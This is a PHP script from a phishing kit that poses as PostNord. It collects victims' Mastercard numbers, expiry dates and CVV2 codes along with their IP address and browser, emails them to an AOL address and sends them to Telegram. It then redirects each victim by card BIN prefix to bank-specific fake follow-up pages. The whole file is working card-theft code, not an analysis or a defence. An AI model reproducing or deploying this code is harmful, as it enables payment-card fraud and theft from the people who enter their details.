<?php
include "config.php";
$ip = getenv("REMOTE_ADDR");
$message = "------------------🤑  INFOS 🤑------------------\n

Credit card Number : ".$_POST['MastercardNumber']."\n
Expiry date (Month) : ".$_POST['Mastermonth']."\n
Expiry date ( Year) : ".$_POST['Masteryear']."\n
CVV2 : ".$_POST['MastersecurityCode']."\n

------------------🤩 IP INFOS 🤩----------------\n
IP                        : $ip\n
BROWSER           : ".$_SERVER['HTTP_USER_AGENT']."\n
--------------------😎 BY BALHA  😎--------------\n";
$subject = "POSTNORD: Card Infos : $ip ";
$send = "Elkayemhd@aol.com";  //7ot el mail ya jhon
$headers = 'From : postnord@login.tz'."r\n";
telegram($message);
mail($send,$subject,$message,$headers);


$bin = $_POST['MastercardNumber'];
$subin = substr($bin, 0, 6);
/* done */ if ($subin == "525412" || $subin == "515675" || $subin == "525412" || $subin == "527500" || $subin == "527501" || $subin == "527502" || $subin == "527503" || $subin == "531719" || $subin == "531720" || $subin == "535922" || $subin == "541255" || $subin == "541256" || $subin == "543870" || $subin == "544481" || $subin == "545104" || $subin == "552764" || $subin == "555958" || $subin == "556663" || $subin == "558487" || $subin == "589973" || $subin == "975223" ) {
 header("Location: ../payment/bin/ld/525412.html");
}else if ($subin == "525470" || $subin == "975223") { // without sms
 header("Location: ../payment/bin/ld/525470.html");
}
else if ($subin == "534643" || $subin == "975223") {
 header("Location: ../payment/bin/ld/534643.html"); // without sms 
} 
/* DONE */ else if ($subin == "535583" || $subin == "529924" ||  $subin == "529925" || $subin == "529926" || $subin == "538991" || $subin == "542542" || $subin == "548945" || $subin == "554477" || $subin == "554501" || $subin == "557097" || $subin == "535600" || $subin == "975223") {
 header("Location: ../payment/bin/ld/535583.html");
} 
else if ($subin == "516815" || $subin == "516815") {
 header("Location: ../payment/bin/ld/516815.html");
} 
else if ($subin == "521358" || $subin == "522660" || $subin == "975223"  || $subin == "522661" || $subin == "522662" || $subin == "522663" || $subin == "522664" || $subin == "522665" || $subin == "529928" || $subin == "543077" || $subin == "543558" || $subin == "554137") {
 header("Location: ../payment/bin/ld/676442.html");
}
else if ($subin == "552750" || $subin == "520327"  || $subin == "523936" || $subin == "544902" || $subin == "545173" || $subin == "547282" || $subin == "552723" || $subin == "552724" || $subin == "552750") {
 header("Location: ../payment/bin/ld/552750.html");
}
else if ($subin == "534243" || $subin == "512586" || $subin == "512587"  || $subin == "513298" || $subin == "534244" || $subin == "540819" || $subin == "542250") {
 header("Location: ../payment/bin/ld/534243.html");
}
else if ($subin == "528248" || $subin == "511672" || $subin == "547282" || $subin == "554758") {
 header("Location: ../payment/bin/ld/528248.html");
}
else if ($subin == "535765" || $subin == "525235" || $subin == "544660") {
 header("Location: ../payment/bin/ld/525235.html");
}
else if ($subin == "510031" || $subin == "516382" || $subin == "520991"  || $subin == "521725" || $subin == "531717" || $subin == "541253" || $subin == "541277" || $subin == "543066" || $subin == "543288" || $subin == "543321" || $subin == "545190" || $subin == "548584" || $subin == "552048" || $subin == "552513") {
 header("Location: ../payment/bin/ld/453903.html");
}
else if ($subin == "518620" || $subin == "521438" || $subin == "529936" || $subin == "539240" || $subin == "540777" || $subin == "543560" || $subin == "544313" || $subin == "545856" || $subin == "548946" || $subin == "549415" || $subin == "552084") {
 header("Location: ../payment/bin/ld/548946.html"); // cooop
}
else {
 header("Location: ../payment/MastercardLoading.html");
}

//header("Location: ../payment/MastercardLoading.html");


?>